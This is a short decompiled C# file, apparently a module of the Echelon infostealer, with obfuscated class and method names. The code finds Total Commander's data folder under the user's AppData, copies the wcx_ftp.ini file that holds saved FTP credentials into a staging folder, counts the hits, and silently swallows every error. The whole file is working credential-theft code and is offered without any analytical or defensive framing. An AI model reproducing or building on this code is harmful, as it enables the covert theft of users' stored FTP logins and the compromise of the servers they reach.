using Echelon;
using System.IO;

internal class af
{
	public static int a;

	public static void a(string il)
	{
		try
		{
			string text = Global.AppDate + "\\GHISLER\\";
			if (Directory.Exists(text))
			{
				Directory.CreateDirectory(il + "\\FTP\\Total Commander");
			}
			FileInfo[] files = new DirectoryInfo(text).GetFiles();
			for (int i = 0; i < files.Length; i++)
			{
				if (files[i].Name.Contains("wcx_ftp.ini"))
				{
					File.Copy(text + "wcx_ftp.ini", il + "\\FTP\\Total Commander\\wcx_ftp.ini");
					af.a++;
				}
			}
		}
		catch
		{
		}
	}
}
